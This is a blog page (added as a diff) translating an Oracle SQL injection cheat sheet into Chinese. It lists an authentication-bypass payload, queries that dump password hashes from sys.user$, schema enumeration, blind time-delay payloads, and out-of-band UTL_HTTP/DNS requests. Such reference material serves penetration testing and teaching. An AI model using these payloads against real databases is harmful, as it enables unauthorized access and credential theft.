@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>SQLi Oracle 基础知识 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="翻译：SQL注入之Oracle篇。">
+<meta name="keywords" content="SQLi,翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi Oracle 基础知识">
+<meta property="og:url" content="http://yoursite.com/2018/03/22/SQLi_ORACLE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="翻译：SQL注入之Oracle篇。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-22T06:21:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi Oracle 基础知识">
+<meta name="twitter:description" content="翻译：SQL注入之Oracle篇。">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SQLi_ORACLE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/22/SQLi_ORACLE/" class="article-date">
+  <time datetime="2018-03-22T07:54:24.000Z" itemprop="datePublished">2018-03-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/翻译/">翻译</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQLi Oracle 基础知识
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>翻译：SQL注入之Oracle篇。</p>
+<a id="more"></a>
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a><a href="https://websec.ca/kb/sql_injection#Oracle_Default_Databases" target="_blank" rel="noopener">Oracle</a></h4><h4 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h4><pre><code>SYSTEM    Available in all versions 所有版本
+SYSAUX    Available in all versions 所有版本
+</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>以下的语句可以注释掉注入语句的其余部分</p>
+<pre><code>--    SQL comment
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT * FROM Users WHERE username = &apos;&apos; OR 1=1 --&apos; AND password = &apos;&apos;;
+</code></pre><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><pre><code>SELECT banner FROM v$version WHERE banner LIKE &apos;Oracle%&apos;;
+SELECT banner FROM v$version WHERE banner LIKE &apos;TNS%&apos;;
+SELECT version FROM v$instance;
+</code></pre><p><strong>注意</strong></p>
+<ul>
+<li><code>Oracle</code>所有的<code>select</code>语句必须包含一个表</li>
+<li><code>dual</code>是一个虚拟的表可以被用来测试(下面的翻译可能要好)</li>
+<li><code>dual</code>是一个可用于测试的虚拟表</li>
+</ul>
+<h4 id="数据库凭证"><a href="#数据库凭证" class="headerlink" title="数据库凭证"></a>数据库凭证</h4><pre><code>SELECT username FROM all_users;    Available on all versions
+SELECT name, password from sys.user$;    Privileged, &lt;= 10g
+SELECT name, spare4 from sys.user$;    Privileged, &lt;= 11g
+</code></pre><h4 id="数据库名字"><a href="#数据库名字" class="headerlink" title="数据库名字"></a>数据库名字</h4><h5 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h5><pre><code>SELECT name FROM v$database;
+SELECT instance_name FROM v$instance
+SELECT global_name FROM global_name
+SELECT SYS.DATABASE_NAME FROM DUAL
+</code></pre><h5 id="用户数据库"><a href="#用户数据库" class="headerlink" title="用户数据库"></a>用户数据库</h5><pre><code>SELECT DISTINCT owner FROM all_tables;
+</code></pre><h4 id="服务器主机名字"><a href="#服务器主机名字" class="headerlink" title="服务器主机名字"></a>服务器主机名字</h4><pre><code>SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name(&apos;10.0.0.1&apos;) FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
+</code></pre><h4 id="表和列"><a href="#表和列" class="headerlink" title="表和列"></a>表和列</h4><p><strong>获取表</strong></p>
+<pre><code>SELECT table_name FROM all_tables;
+</code></pre><p><strong>获取列</strong></p>
+<pre><code>SELECT column_name FROM all_tab_columns;
+</code></pre><p><strong>从列名中查找表</strong></p>
+<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = &apos;Users&apos;;
+</code></pre><p><strong>从表名中查找列</strong></p>
+<pre><code>SELECT table_name FROM all_tab_tables WHERE column_name = &apos;password&apos;;
+</code></pre><p><strong>一次获取多张表</strong></p>
+<pre><code>SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || &apos;,&apos;)).EXTRACT(&apos;//text()&apos;).EXTRACT(&apos;//text()&apos;) ,&apos;,&apos;) FROM all_tables;
+</code></pre><h4 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h4><p>不像其他关系型数据库，<code>Oracle</code>允许表/列名字编码</p>
+<pre><code>SELECT 0x09120911091 FROM dual;    Hex Encoding.
+SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;    CHR() Function.
+</code></pre><h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><pre><code>SELECT &apos;a&apos;||&apos;d&apos;||&apos;mi&apos;||&apos;n&apos; FROM dual;
+</code></pre><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><pre><code>SELECT CASE WHEN 1=1 THEN &apos;true&apos; ELSE &apos;false&apos; END FROM dual
+</code></pre><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><p><strong>延迟</strong></p>
+<pre><code>SELECT UTL_INADDR.get_host_address(&apos;non-existant-domain.com&apos;) FROM dual;
+</code></pre><p><strong>严重时间延迟</strong></p>
+<pre><code>AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) &gt; 0 AND 300 &gt; ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1));
+</code></pre><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><pre><code>SELECT privilege FROM session_privs;
+SELECT grantee, granted_role FROM dba_role_privs; (Privileged)
+</code></pre><h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p><strong>DNS 请求</strong></p>
+<pre><code>SELECT UTL_HTTP.REQUEST(&apos;http://localhost&apos;) FROM dual;
+SELECT UTL_INADDR.get_host_address(&apos;localhost.com&apos;) FROM dual;
+</code></pre><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><p>一个<code>Metasploit</code>模块<a href="https://www.rapid7.com/db/modules/auxiliary/analyze/jtr_oracle_fast" target="_blank" rel="noopener"><code>JTR</code></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/22/SQLi_ORACLE/" data-id="cjj2ofdqv000nrbxd589ew5d3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/翻译/">翻译</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/26/sqlmap_os_shell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQLMAP --os-shell 学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/21/SQLi_MSSQL/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SQLi MSSQL基础知识</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WAF/">WAF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全资料汇集/">Web安全资料汇集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web开发/">Web开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全研究/">安全研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术研究/">技术研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透技巧/">渗透技巧</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法与数据结构/">算法与数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程学习/">编程学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机基础/">计算机基础</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bypasswaf/">Bypasswaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Django/">Django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Javascript/">Javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jboss/">Jboss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Struts/">Struts</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/">Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Weblogic/">Weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iis-shortname/">iis-shortname</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-log/">ssh-log</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/翻译/">翻译</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Bypasswaf/" style="font-size: 17.5px;">Bypasswaf</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/Django/" style="font-size: 12.5px;">Django</a> <a href="/tags/Flask/" style="font-size: 15px;">Flask</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jboss/" style="font-size: 10px;">Jboss</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/SQLi/" style="font-size: 20px;">SQLi</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Struts/" style="font-size: 12.5px;">Struts</a> <a href="/tags/Tomcat/" style="font-size: 10px;">Tomcat</a> <a href="/tags/Weblogic/" style="font-size: 12.5px;">Weblogic</a> <a href="/tags/XSS/" style="font-size: 12.5px;">XSS</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/iis-shortname/" style="font-size: 10px;">iis-shortname</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/ssh-log/" style="font-size: 10px;">ssh-log</a> <a href="/tags/翻译/" style="font-size: 17.5px;">翻译</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/06/28/Wordpress <= 4.9.6 任意文件删除漏洞/">Wordpress 任意文件删除</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/27/recursion_digui/">递归</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/23/链表/">链表</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/18/Weblogic反序列化漏洞(CVE-2018-2628)/">Weblogic反序列化漏洞(CVE-2018-2628)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/11/Web_collect/">Web安全资料汇集</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
